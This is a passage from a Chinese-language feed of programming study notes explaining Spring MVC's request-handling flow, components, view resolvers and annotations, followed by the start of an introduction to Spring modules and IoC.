<li>耦合性低：视图(页面)和业务层(数据处理)分离，一个应用的业务流程或者业务规则的改变只需要改动MVC中的模型即可，不会影响到控制器与视图</li>
<li>部署快，成本低：MVC使开发和维护用户接口的技术含量降低。使用MVC模式使开发时间得到相当大的缩减，它使程序员（Java开发人员）集中精力于业务逻辑，界面程序员（HTML和JSP开发人员）集中精力于表现形式上</li>
<li>可维护性高：分离视图层和业务逻辑层也使得WEB应用更易于维护和修改</li>
</ul>
<p><strong>MVC在Web中的缺点</strong></p>
<ul>
<li>调试困难：因为模型和视图要严格的分离，这样也给调试应用程序带来了一定的困难，每个构件在使用之前都需要经过彻底的测试</li>
<li>不适合小型，中等规模的应用程序：在一个中小型的应用程序中，强制性的使用MVC进行开发，往往会花费大量时间，并且不能体现MVC的优势，同时会使开发变得繁琐</li>
<li>增加系统结构和实现的复杂性：对于简单的界面，严格遵循MVC，使模型、视图与控制器分离，会增加结构的复杂性，并可能产生过多的更新操作，降低运行效率</li>
<li>视图与控制器间的过于紧密的连接并且降低了视图对模型数据的访问：视图与控制器是相互分离，但却是联系紧密的部件，视图没有控制器的存在，其应用是很有限的，反之亦然，这样就妨碍了他们的独立重用。依据模型操作接口的不同，视图可能需要多次调用才能获得足够的显示数据。对未变化数据的不必要的频繁访问，也将损害操作性能</li>
</ul>
<h2 id="spring-mvc" tabindex="-1"> Spring MVC</h2>
<p>Spring MVC采用了松散耦合的可插拔组件结构，比其他的MVC框架更具有灵活性和扩展性，Spring MVC通过使用一套注解，使一个Java类成为前端控制器(Controller)，不需要实现任何接口，同时，Spring MVC支持REST形式的URL请求，除此之外，Spring MVC在在数据绑定、视图解析、本地化处理及静态资源处理上都有许多不俗的表现。</p>
<h3 id="springmvc-特点" tabindex="-1"> SpringMVC 特点</h3>
<ol>
<li>清晰的角色划分：
<ul>
<li>前端控制器（DispatcherServlet）</li>
<li>请求到处理器映射（HandlerMapping）</li>
<li>处理器适配器（HandlerAdapter）</li>
<li>视图解析器（ViewResolver）</li>
<li>处理器或页面控制器（Controller）</li>
<li>验证器（ Validator）</li>
<li>表单对象（Form Object 提供给表单展示和提交到的对象就叫表单对象）</li>
</ul>
</li>
<li>由于命令对象就是一个POJO，无需继承框架特定API，可以使用命令对象直接作为业务对象；</li>
<li>和Spring 其他框架无缝集成，是其它Web框架所不具备的；</li>
<li>可适配，通过HandlerAdapter可以支持任意的类作为处理器；</li>
<li>可定制性，HandlerMapping、ViewResolver等能够非常简单的定制；</li>
<li>功能强大的数据验证、格式化、绑定机制；</li>
<li>利用Spring提供的Mock对象能够非常简单的进行Web层单元测试；</li>
<li>本地化、主题的解析的支持，使我们更容易进行国际化和主题的切换。</li>
<li>非常容易与其它视图技术集成，如Velocity、FreeMarker等，因为模型数据不放在特定的API里，而是放在一 个Model里（Map数据结构实现，因此很容易被其他框架使用）。</li>
<li>RESTful风格的支持、简单的文件上传、约定优于配置的契约式编程支持、基于注解的零配置支持。</li>
</ol>
<h3 id="对比-struts2" tabindex="-1"> 对比 Struts2</h3>
<ol>
<li>spring mvc是基于方法的设计，而struts2是基于类的设计。</li>
<li>struts2有以自己的interceptor机制，spring mvc用的是独立的AOP方式。</li>
<li>spring mvc的方法之间基本上独立的，独享request response数据，struts2所有Action变量是共享的。</li>
<li>机制：spring mvc的入口是servlet，而struts2是filter。</li>
<li>性能：spring会稍微比struts快。 spring mvc是基于方法的设计 ， 而sturts是基于类 ， 每次发一次请求都会实例一个action，每个action都会被注入属性，而spring基于方法，粒度更细</li>
<li>参数传递：struts是在接受参数的时候，可以用属性来接受参数，这就说明参数是让多个方法共享的。</li>
<li>设计思想上： struts更加符合oop的编程思想 ， spring就比较谨慎，在servlet上扩展。</li>
<li>intercepter(拦截器)的实现机制：struts有以自己的interceptor机制， spring mvc用的是独立的AOP方式 。</li>
</ol>
<h1 id="spring-mvc请求响应过程" tabindex="-1"> Spring MVC请求响应过程</h1>
<p><img src="@source/assets/cs-note/framework/spring/mk-2020-07-12-11-02-07.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/framework/spring/SpringMVC请求响应处理流程.png" alt="" loading="lazy"></p>
<p>具体步骤：</p>
<ol>
<li>发起请求到前端控制器(DispatcherServlet)</li>
<li>前端控制器请求HandlerMapping查找 Handler （可以根据xml配置、注解进行查找）</li>
<li>处理器映射器HandlerMapping向前端控制器返回Handler，HandlerMapping会把请求映射为HandlerExecutionChain对象(包含一个Handler处理器（页面控制器）对象，多个HandlerInterceptor拦截器对象），通过这种策略模式，很容易添加新的映射策略</li>
<li>前端控制器调用处理器适配器去执行Handler</li>
<li>处理器适配器HandlerAdapter将会根据适配的结果去执行Handler</li>
<li>Handler执行完成给适配器返回ModelAndView</li>
<li>处理器适配器向前端控制器返回ModelAndView （ModelAndView是springmvc框架的一个底层对象，包括 Model和view）</li>
<li>前端控制器请求视图解析器去进行视图解析 （根据逻辑视图名解析成真正的视图(jsp)），通过这种策略很容易更换其他视图技术，只需要更改视图解析器即可</li>
<li>视图解析器向前端控制器返回View</li>
<li>前端控制器进行视图渲染 （视图渲染将模型数据(在ModelAndView对象中)填充到request域）</li>
<li>前端控制器向用户响应结果</li>
</ol>
<h2 id="spring-mvc组件" tabindex="-1"> Spring MVC组件</h2>
<h3 id="dispatcherservlet-前端控制器" tabindex="-1"> DispatcherServlet 前端控制器</h3>
<ul>
<li>用户请求到达前端控制器,相当于MVC中的C</li>
<li>DispatcherServlet是整个流程的核心,它来调用其他组件来处理用户请求,前端控制器的存在降低了其他组件之间的耦合度.</li>
</ul>
<h3 id="handlermapping-处理器映射器" tabindex="-1"> HandlerMapping 处理器映射器</h3>
<ul>
<li>HandlerMapping 负责根据用户请求找到Handler即处理器。（如用户自定义的Controller）SpringMVC提供了不同的映射器实现不同的映射方式，例如：配置文件方式，实现接口方式，注解方式等。</li>
<li>映射器相当于配置信息或注解描述。映射器内部封装了一个类似map的数据结构。使用URL作为key，HandlerExecutionChain作为value。核心控制器，可以通过请求对象（请求对象中包含请求的 URL）在handlerMapping中查询HandlerExecutionChain对象。</li>
<li>是SpringMVC核心组件之一。是必不可少的组件。无论是否配置，SpringMVC 会有默认提供。</li>
<li>默认的映射器是：RequestMappingHandlerMapping。（老版本中有其他的映射器，但是已经过时。）</li>
</ul>
<h3 id="handleradapter-处理器适配器" tabindex="-1"> HandlerAdapter 处理器适配器</h3>
<ul>
<li>通过HandlerAdapter对处理器（Handler）进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。</li>
<li>适配器也是 SpringMVC 中的核心组件之一。必须存在。SpringMVC 框架有默认值。</li>
<li>典型的适配器：SimpleControllerHandlerAdapter，最基础的。处理自定义控制器（Handler）和SpringMVC控制器顶级接口Controller之间关联的。</li>
</ul>
<h3 id="handler-处理器" tabindex="-1"> Handler 处理器</h3>
<ul>
<li>Handler 是后端控制器, 在前端控制器的控制下后端控制器对具体的用户请求进行处理，Handler涉及到具体的用户请求,所以一般情况下需要程序员根据自己的业务开发</li>
<li>在SpringMVC中对Handler没有强制的类型要求。在SpringMVC框架中，对Handler的引用定义类型为Object</li>
<li>处理器理论上说不是必要的核心组件。</li>
<li>SpringMVC框架是一个线程不安全的，轻量级的框架。一个handler对象，处理所有的请求。开发过程中，注意线程安全问题。</li>
</ul>
<h3 id="viewresolver-视图解析器" tabindex="-1"> ViewResolver 视图解析器</h3>
<ul>
<li>ViewResolver 负责将处理结果生成 View 视图，ViewResolver 首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成 View 视图对象，最后对 View 进行渲染将处理结果通过页面展示给用户。</li>
<li>是SpringMVC中必要的组件之一。SpringMVC提供默认视图解析器。</li>
</ul>
<h3 id="view-视图" tabindex="-1"> View 视图</h3>
<p>View是一个接口，实现类支持不同的View类型（jsp、freemarker、pdf...）需要工程师开发</p>
<h2 id="spring-mvc工作详解" tabindex="-1"> Spring MVC工作详解</h2>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-run.png" alt="" loading="lazy"></p>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-src-logic.png" alt="" loading="lazy"></p>
<h3 id="处理器映射-handlermapping" tabindex="-1"> 处理器映射 HandlerMapping</h3>
<p><a href="https://www.jianshu.com/p/f04816ee2495" target="_blank" rel="noopener noreferrer">处理器映射详解</a></p>

<p>SpringMVC 内部是根据 HandlerMapping 将 Request 和 Controller 里面的方法对应起来的。
<code>HandlerMapping</code> 功能就是根据请求匹配到对应的 <code>Handler，然后将找到的</code> <code>Handler</code> 和所有匹配的 <code>HandlerInterceptor</code> （拦截器）绑定到创建的 <code>HandlerExecutionChain</code> 对象上并返回。</p>
<p><code>HandlerMapping</code> 只是一个接口类，不同的实现类有不同的匹对方式，根据功能的不同我们需要在 SpringMVC 容器中注入不同的映射处理器 <code>HandlerMapping。</code></p>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-HandlerMapping过程.png" alt="" loading="lazy"></p>
<h4 id="handlermapping-接口" tabindex="-1"> HandlerMapping 接口</h4>
<p>容器被初始化的时候会被调用，加载容器中注入的 HandlerMapping。其实常用到的 HandlerMapping 都是由 <code>&lt;mvc:annotation-driven /&gt;</code> 标签帮我们注册的(包括 RequestMappingHandlerMapping 和 BeanNameUrlHandlerMapping)，如果没有写该标签系统也会帮我们注入默认的映射器，当然也有些需要我们自己手动注入。</p>
<p>在 HandlerMapping 接口中只有一个方法</p>
<div><pre><code>    <span>HandlerExecutionChain</span> <span>getHandler</span><span>(</span><span>HttpServletRequest</span> request<span>)</span> <span>throws</span> <span>Exception</span><span>;</span>
</code></pre></div><p><img src="@source/assets/cs-note/framework/spring/HandlerMapping类结构层次.png" alt="" loading="lazy"></p>
<p><strong>AbstractHandlerMapping</strong></p>
<p>实现 <code>getHandler()</code> 接口方法得到 HandlerExecutionChain 对象</p>
<p><code>getHandler()</code> 调用抽象方法 <code>getHandlerInternal()</code> 匹配并返回对应的 Handler 对象</p>
<h5>1. AbstractUrlHandlerMapping</h5>
<p>URL 映射的抽象基类，提供将处理程序映射到 Controller，所以该类最终直接返回的 handler 就是 Controller 对象</p>
<ul>
<li>实现父抽象类的抽象方法 <code>getHandlerInternal()</code> 匹配并返回对应的 Handler 对象</li>
<li>根据路径匹对 handler 的方法 <code>lookupHandler()</code></li>
<li>从 <code>this.handlerMap</code> 中通过 urlPath 匹对找到对应的 handler 对象</li>
<li><code>registerHandler(String urlPath, Object handler)</code> 在子类中被调用将 handler 对象加入到 this.handlerMap</li>
</ul>
<p>AbstractUrlHandlerMapping 的子类从大致分为两类：</p>
<ul>
<li>间接继承 AbstractUrlHandlerMapping 的 BeanNameUrlHandlerMapping</li>
<li>直接继承 AbstractUrlHandlerMapping 的 SimpleUrlHandlerMapping</li>
</ul>
<p><strong>1.1 BeanNameUrlHandlerMapping</strong></p>
<p>在 SpringMVC 容器中，且在注入了 <code>BeanNameUrlHandlerMapping</code> 映射器的时候，只要是以 &quot;/&quot; 开头的 bean 的 name，都会作为该映射器匹配的 Handler 对象</p>
<p>注意手动注入 BeanNameUrlHandlerMapping 映射器记得不要跟 <code>&lt;mvc:annotation-driven /&gt;</code> 标签自动帮我们注入重复(如自己手动注入要么放在 <code>&lt;mvc:annotation-driven /&gt;</code> 标签之前，要么直接不写)。
注意自定义 Controller 实现类注入 bean 的 id 或 name 必须以 &quot;/&quot; 开头，BeanNameUrlHandlerMapping 映射器主要映射以 &quot;/&quot; 开头的 beanName。</p>
<p><strong>1.2 SimpleUrlHandlerMapping</strong></p>
<p>SimpleUrlHandlerMapping 映射器跟前面 BeanNameUrlHandlerMapping 映射器有点不一样。后者是有点类似遍历容器里面有所的 bean 的 name 或 id 找到匹配的，并且 bean 的 name 或 id 有特殊要求，匹配的则加入。而前者则是先将加入该映射器的 handler 先加进该映射器的一个集合属性里面，容器初始化的时候免去了遍历麻烦的步骤。</p>
<h5>2. AbstractHandlerMethodMapping</h5>
<p>AbstractHandlerMethodMapping 最终获取的 handler 是 <code>HandlerMethod</code> 类型对象。</p>
<p>类的实现链</p>
<ul>
<li>AbstractHandlerMethodMapping
<ul>
<li>RequestMappingInfoHandlerMapping
<ul>
<li>RequestMappingHandlerMapping</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>2.1 HandlerMethod</strong></p>
<p>HandlerMethod 其实可以简单理解为保持方法信息的pojo类</p>
<p><strong>2.2 RequestMappingInfo 类</strong></p>
<p>主要用来记录方法上 @RequestMapping() 注解里面的参数，针对 RequestMappingHandlerMapping 映射器来使用。</p>
<p>RequestMappingInfo 对象是用来装载方法的匹配相关信息，每个匹配的方法都会对应一个 RequestMappingInfo 对象</p>
<p><strong>2.3 RequestMappingHandlerMapping</strong></p>
<p>存储映射关系对象(<code>MappingRegistry</code>)</p>
<p>该实体类里面最重要的两个记录集合分别是 mappingLookup 和 urlLookup</p>
<ul>
<li>
<p>urlLookup：主要用来记录 lookupPath 请求路径对应的 mapping 集合。这里 Spring 留了一个很活的机制，拿 @RequestMapping 注解来说，他的 value 属性本身就是一个字符数组，在多重设置中难免有路径重复的，所以最终有可能会出现一个 lookupPath 对应多个 RequestMappingInfo，最终在请求过来的时候给了自定义抽象方法让实现类自己实现择优的方式MutivalueMap 是 SpringMVC 自定义的一个 Map 类，key 对应的 value 是一个集合，这从名字上也能看出来。</p>
</li>
<li>
<p>mappingLookup：key 是 mapping 对象，value 是 HandlerMethod 对象，最终是通过 lookupPath 在 urlLookup 集合中找到对应的 mapping 对象，通过 mapping 在 mappingLookup 集合中找到 HandlerMethod 对象。</p>
</li>
</ul>
<h4 id="总结" tabindex="-1"> 总结</h4>
<p>现在开发基本都不用 AbstractUrlHandlerMapping 这种类型的映射器了，但是 SpringMVC 内部还有用到的地方，例如直接 &lt;mvc:view-controller path=&quot;&quot; view-name=&quot;&quot;/&gt; 标签配置资源不经过视图控制器直接跳转就用到了 SimpleUrlHandlerMapping 这种映射器。AbstractUrlHandlerMapping 匹对解析对应请求最终返回的 handler 是 Controller 对象。</p>
<p>现在习惯直接用 @Controller 和 @RequestMapping 这样注解来描述视图控制器的逻辑，这种资源映射用的是 AbstractHandlerMethodMapping 抽象类的子类 RequestMappingHandlerMapping 映射器，匹对解析对应的请求返回HandlerMethod 对象。</p>
<h3 id="处理器适配器-handleradapter" tabindex="-1"> 处理器适配器 HandlerAdapter</h3>

<p><a href="https://www.jianshu.com/p/23ad68d8b421" target="_blank" rel="noopener noreferrer">处理器适配器 详解</a></p>
<p>不同的映射处理器(HandlerMapping) 映射出来的 handler 对象是不一样的，AbstractUrlHandlerMapping 映射器映射出来的是 handler 是 Controller 对象，AbstractHandlerMethodMapping 映射器映射出来的 handler 是 HandlerMethod 对象。映射的处理器也应该有很多种，不同的映射由不同的适配器来负责解析。</p>
<h4 id="handleradapter-接口" tabindex="-1"> HandlerAdapter 接口</h4>
<p><img src="@source/assets/cs-note/framework/spring/HandlerAdapter类结构层次.png" alt="" loading="lazy"></p>
<div><pre><code><span>public</span> <span>interface</span> <span>HandlerAdapter</span> <span>{</span>
    <span>boolean</span> <span>supports</span><span>(</span><span>Object</span> var1<span>)</span><span>;</span>

    <span>@Nullable</span>
    <span>ModelAndView</span> <span>handle</span><span>(</span><span>HttpServletRequest</span> var1<span>,</span> <span>HttpServletResponse</span> var2<span>,</span> <span>Object</span> var3<span>)</span> <span>throws</span> <span>Exception</span><span>;</span>

    <span>long</span> <span>getLastModified</span><span>(</span><span>HttpServletRequest</span> var1<span>,</span> <span>Object</span> var2<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><h3 id="参数解析-handleradapter-handler" tabindex="-1"> 参数解析 HandlerAdapter Handler</h3>
<p>HandlerAdapter 描述了 handler 是怎么匹配到合适的适配器，进行 handler 对应方法的执行。其他几种适配器还好，但是 RequestMappingHandlerAdapter 适配器对应接下来的参数解析及绑定并执行并不是那么简单。</p>

<p>RequestMappingHandlerAdapter 大概解析流程如下</p>
<p><img src="@source/assets/cs-note/framework/spring/spring-mvc-run-RequestMappingHandlerAdapter解析流程.png" alt="" loading="lazy"></p>
<p><a href="https://www.jianshu.com/p/2bfd65bc9ce4" target="_blank" rel="noopener noreferrer">参数解析 HandlerAdapter Handler</a></p>
<p><a href="https://www.jianshu.com/p/6eba4e2c6cab" target="_blank" rel="noopener noreferrer">自定义参数解析 HandlerAdapter Handler</a></p>
<h4 id="handlermethod" tabindex="-1"> HandlerMethod</h4>
<ul>
<li>HandlerMethod 封装方法定义相关的信息 (如类、方法、参数等)</li>
<li>InvocableHandlerMethod 参数准备委托 HandlerMethodArgumentResolver 进行具体的解析</li>
<li>ServletInvocableHandlerMethod 添加返回值处理职责，ResponseStatus 处理</li>
</ul>
<p>在容器初始化的时候，RequestMappingHandlerMapping 映射处理器就将 @RequestMapping 描述的方法以 RequestMappingInfo 为 key，HandlerMethod 为 value 放进自己的缓存</p>
<h4 id="解析器" tabindex="-1"> 解析器</h4>
<p>参数解析器(HandlerMethodArgumentResolver)
返回值的解析器(HandlerMethodReturnValueHandler)</p>
<p>参数解析及转换的过程，先是通过参数解析器解析参数，然后再是转换器转换参数，最终绑定到对应 RequestMapping 方法参数上。</p>
<p>有些开发场景中，SpringMVC 提供的参数解析器满足不了咱们的需求。例如在数据量大的提交环境中，提交数据用到了表单和JSON融合的方式，就是表单某个字段的 value 是JSON字符串。
如果整个提交的数据体是JSON数据还好，导入Jackson架包，用 @RequestBody 修饰参数，最终 SpringMVC 会通过自带的 RequestResponseBodyMethodProcessor 解析器进行解析，使用 Jackson 提供的 MappingJackson2HttpMessageConverter 转换器将JSON数据转换成我们想要的格式。</p>
<p>如果提交的是正常表单数据也好，用 @RequestParam 修饰参数，最终 SpringMVC 会通过自带的 RequestParamMethodArgumentResolver 解析器解析出表单里面的 value，然后找到合适的转换器将数据装换成我们想要的格式。</p>
<h3 id="视图解析-view-viewresolver" tabindex="-1"> 视图解析 View &amp; ViewResolver</h3>
<p><a href="https://www.jianshu.com/p/ec70ae3d1021" target="_blank" rel="noopener noreferrer">视图解析 View &amp; ViewResolver</a></p>
<h4 id="modelandview" tabindex="-1"> ModelAndView</h4>
<p>SpringMVC 内部最终会将返回的参数及视图名字封装成一个 ModelAndView 对象，这个对象包含两个部分：Model 是一个 HashMap 集合，View 一般则是一个 String 类型记录要跳转视图的名字或者是视图对象(如果是视图对象的话则直接跳过视图解析器的解析过程)</p>
<h4 id="视图-view" tabindex="-1"> 视图 View</h4>
<p>视图的作用是渲染模型数据，将模型里的数据以某种形式呈现给客户，其实就是 html、jsp 甚至 word、excel 文件；</p>
<table>
<thead>
<tr>
<th>视图</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>InternalResourceView</td>
<td>将 JSP 或其他资源封装成一个视图，一般 JSP 页面用该视图类</td>
</tr>
<tr>
<td>JstlView</td>
<td>继承自InternalResourceView，如果 JSP 页面使用了 JSTL 标签，则需要使用该视图类</td>
</tr>
<tr>
<td>AbstractPdfView</td>
<td>PDF视图的抽象超类</td>
</tr>
<tr>
<td>AbstractXlsView</td>
<td>传统XLS格式的Excel文档视图的便捷超类，与Apache POI 3.5及更高版本兼容。</td>
</tr>
<tr>
<td>AbstractXlsxView</td>
<td>Office 2007 XLSX格式的Excel文档视图的便捷超类，兼容Apache POI 3.5及更高版本。</td>
</tr>
<tr>
<td>MappingJackson2JsonView</td>
<td>将模型数据 通过 Jackson 开源框架的 ObjectMapper 以 JSON 方式输出</td>
</tr>
</tbody>
</table>
<h4 id="视图解析器-viewresolver" tabindex="-1"> 视图解析器 ViewResolver</h4>
<p>SpringMVC 为逻辑视图名的解析提供了不同的策略，可以在 Spring Web 上下文中配置一种或多种解析策略，并指定他们之间的先后顺序。</p>
<ul>
<li>每一种映射策略对应一个具体的视图解析器实现类。</li>
<li>视图解析器的作用是将逻辑视图解析为一个具体的物理视图对象。</li>
<li>所有的视图解析器都必须实现 ViewResolver 接口。</li>
<li>可以选择一种或多种视图解析器，可以通过其 order 属性指定解析器的优先顺序，order 越小优先级越高。</li>
<li>SpringMVC 会按照视图解析器顺序的优先次序进行解析，直到返回视图对象。若无，则抛出 ServletException 异常。</li>
</ul>
<table>
<thead>
<tr>
<th>视图解析器</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>AbstractCachingViewResolver</td>
<td>一个抽象视图，继承该类可以让视图解析器具有缓存功能</td>
</tr>
<tr>
<td>XmlViewResolver</td>
<td>接受XML文件的视图解析器，默认配置文件在 /WEB-INF/views.xml</td>
</tr>
<tr>
<td>ResourceBundleViewResolver</td>
<td>使用properties配置文件的视图解析器，默认配置文件是类路径下的views.properties</td>
</tr>
<tr>
<td>UrlBasedViewResolver</td>
<td>一个简单的视图解析器，不做任何匹配，需要视图名和实际视图文件名相同</td>
</tr>
<tr>
<td>InternalResourceViewResolver</td>
<td>UrlBasedViewResolver的一个子类，支持Servlet容器的内部类型（JSP、Servlet、以及JSTL等），可以使用setViewClass(..)指定具体的视图类型</td>
</tr>
<tr>
<td>FreeMarkerViewResolver</td>
<td>也是UrlBasedViewResolver的子类，用于FreeMarker视图技术</td>
</tr>
<tr>
<td>ContentNegotiatingViewResolver</td>
<td>用于解析基于请求文件名或Accept header的视图</td>
</tr>
<tr>
<td>BeanNameViewResolver</td>
<td>将逻辑视图名解析为一个 Bean，Bean 的 id 等于逻辑视图名</td>
</tr>
</tbody>
</table>
<h3 id="标签-mvc-annotation-driven" tabindex="-1"> 标签 <code>&lt;mvc:annotation-driven/&gt;</code></h3>
<p><code>&lt;mvc:annotation-driven/&gt;</code>，这个标签会帮我们注入很多关键而实用的bean，但是用它也得小心跟自己手动注入的bean重复，会造成不必要的麻烦。</p>
<p>所有的自定义命名空间（像mvc，context等）下的标签解析都是由BeanDefinitionParser 接口的实现类来完成的；<code>&lt;mvc:annotation-driven/&gt;</code>标签，找到对应的实现类是org.springframework.web.servlet.config.AnnotationDrivenBeanDefinitionParser。</p>
<p>AnnotationDrivenBeanDefinitionParser，为 <code>&lt;annotation-driven /&gt;</code> MVC名称空间元素提供配置。</p>
<p>注册以下 <strong>HandlerMappings</strong> (映射器们)：</p>
<ul>
<li>RequestMappingHandlerMapping 的排序为0，用于将请求映射到带@RequestMapping注释的控制器方法。</li>
<li>BeanNameUrlHandlerMapping 在排序为2，以将URL路径映射到控制器bean名称。</li>
</ul>
<p>注册以下 <strong>HandlerAdapters</strong> (适配器们)：</p>
<ul>
<li>RequestMappingHandlerAdapter 用于使用带@RequestMapping注解的控制器方法处理请求。</li>
<li>HttpRequestHandlerAdapter 用于使用HttpRequestHandlers处理请求。</li>
<li>SimpleControllerHandlerAdapter 用于使用基于接口的控制器处理请求。</li>
</ul>
<p>注册以下 <strong>HandlerExceptionResolvers</strong> (异常处理解析器们)：</p>
<ul>
<li>ExceptionHandlerExceptionResolver，用于通过 org.springframework.web.bind.annotation.ExceptionHandler 方法处理异常。</li>
<li>ResponseStatusExceptionResolver 用于使用 org.springframework.web.bind.annotation.ResponseStatus 注释的异常。</li>
<li>DefaultHandlerExceptionResolver 用于解析已知的Spring异常类型</li>
</ul>
<p><strong>其他</strong></p>
<ul>
<li>注册 org.springframework.util.AntPathMatcher 和 org.springframework.web.util.UrlPathHelper 以供 RequestMappingHandlerMapping、ViewControllers 的 HandlerMapping 和 HandlerMapping 服务资源是使用。</li>
</ul>
<h1 id="spring-mvc-注解" tabindex="-1"> Spring MVC 注解</h1>
<p>@<strong>EnableWebMvc</strong></p>
<p>在配置类中开启Web MVC的配置支持，如一些ViewResolver或者MessageConverter等，若无此句，重写WebMvcConfigurerAdapter方法（用于对SpringMVC的配置）。</p>
<p>@<strong>Controller</strong></p>
<p>声明该类为SpringMVC中的Controller</p>
<p>@<strong>RequestMapping</strong></p>
<p>用于映射Web请求，包括访问路径和参数（类或方法上）</p>
<p>@<strong>ResponseBody</strong></p>
<p>支持将返回值放在response内，而不是一个页面，通常用户返回json数据（返回值旁或方法上）</p>
<p>@<strong>RequestBody</strong></p>
<p>允许request的参数在request体中，而不是在直接连接在地址后面。（放在参数前）</p>
<p>@<strong>RequestParam</strong></p>
<p>将请求的参数绑定到方法中的参数上，有required参数，默认情况下，required=true，也就是该参数必须要传。</p>
<p>@<strong>PathVariable</strong></p>
<p>用于接收路径参数，比如@RequestMapping(“/hello/{name}”)申明的路径，将注解放在参数中前，即可获取该值，通常作为Restful的接口实现方法。</p>
<p>@<strong>RestController</strong></p>
<p>该注解为一个组合注解，相当于@Controller和@ResponseBody的组合，注解在类上，意味着，该Controller的所有方法都默认加上了@ResponseBody。</p>
<p>@<strong>ControllerAdvice</strong></p>
<p>通过该注解，我们可以将对于控制器的全局配置放置在同一个位置，注解了@Controller的类的方法可使用@ExceptionHandler、@InitBinder、@ModelAttribute注解到方法上，
这对所有注解了 @RequestMapping的控制器内的方法有效。</p>
<p>@<strong>ExceptionHandler</strong></p>
<p>用于全局处理控制器里的异常</p>
<p>@<strong>InitBinder</strong></p>
<p>用来设置WebDataBinder，WebDataBinder用来自动绑定前台请求参数到Model中。</p>
<p>@<strong>ModelAttribute</strong></p>
<p>本来的作用是绑定键值对到Model里，在@ControllerAdvice中是让全局的@RequestMapping都能获得在此处设置的键值对。</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Spring 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Spring.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="spring-介绍" tabindex="-1"> Spring 介绍</h1>
<p>Spring 框架指的都是 Spring Framework，它是很多模块的集合，使用这些模块可以很方便地协助我们进行开发。这些模块是：核心容器、数据访问/集成,、Web、AOP（面向切面编程）、工具、消息和测试模块。</p>
<p>Spring 官网列出的 Spring 的 6 个特征:</p>
<ul>
<li><strong>核心技术</strong> ：依赖注入(DI)，AOP，事件(events)，资源，i18n，验证，数据绑定，类型转换，SpEL。</li>
<li><strong>测试</strong> ：模拟对象，TestContext框架，Spring MVC 测试，WebTestClient。</li>
<li><strong>数据访问</strong> ：事务，DAO支持，JDBC，ORM，编组XML。</li>
<li><strong>Web支持</strong> : Spring MVC和Spring WebFlux Web框架。</li>
<li><strong>集成</strong> ：远程处理，JMS，JCA，JMX，电子邮件，任务，调度，缓存。</li>
<li><strong>语言</strong> ：Kotlin，Groovy，动态语言。</li>
</ul>
<h2 id="spring模块" tabindex="-1"> Spring模块</h2>
<p>下图对应的是 Spring4.x 版本。目前最新的5.x版本中 Web 模块的 Portlet 组件已经被废弃掉，同时增加了用于异步响应式处理的 WebFlux 组件。</p>
<p><img src="@source/assets/cs-note/framework/spring/Spring主要模块.png" alt="Spring主要模块" loading="lazy"></p>
<ul>
<li><strong>Spring Core</strong>： 基础,可以说 Spring 其他所有的功能都需要依赖于该类库。主要提供 IoC 依赖注入功能。</li>
<li><strong>Spring Context</strong>: 构建于Core封装包基础上的 Context封装包，提供了一种框架式的对象访问方法，有些象JNDI注册器。Context封装包的特性得自于Beans封装包，并添加了对国际化（I18N）的支持（例如资源绑定），事件传播，资源装载的方式和Context的透明创建，比如说通过Servlet容器。</li>
<li><strong>Spring Aspects</strong> ： 该模块为与AspectJ的集成提供支持。</li>
<li><strong>Spring AOP</strong> ：提供了面向切面的编程实现。</li>
<li><strong>Spring JDBC</strong> : Java数据库连接。</li>
<li><strong>Spring JMS</strong> ：Java消息服务。</li>
<li><strong>Spring ORM</strong> : 用于支持Hibernate等ORM工具。</li>
<li><strong>Spring DAO</strong>:  DAO (Data Access Object)提供了JDBC的抽象层，它可消除冗长的JDBC编码和解析数据库厂商特有的错误代码。 并且，JDBC封装包还提供了一种比编程性更好的声明性事务管理方法，不仅仅是实现了特定接口，而且对所有的POJOs（plain old Java objects）都适用。</li>
<li><strong>Spring Web</strong> : 为创建Web应用程序提供支持。</li>
<li><strong>Spring Test</strong> : 提供了对 JUnit 和 TestNG 测试的支持。</li>
</ul>
<h1 id="spring-ioc" tabindex="-1"> Spring IoC</h1>
<p>IoC（Inverse of Control:控制反转）是一种设计思想，就是 将原本在程序中手动创建对象的控制权，交由Spring框架来管理。 IoC 在其他语言中也有应用，并非 Spirng 特有。 IoC 容器是 Spring 用来实现 IoC 的载体， IoC 容器实际上就是个Map（key，value）,Map 中存放的是各种对象。</p>
<p><strong>IoC 容器就像是一个工厂一样，当我们需要创建一个对象的时候，只需要配置好配置文件/注解即可，完全不用考虑对象是如何被创建出来的。</strong></p>
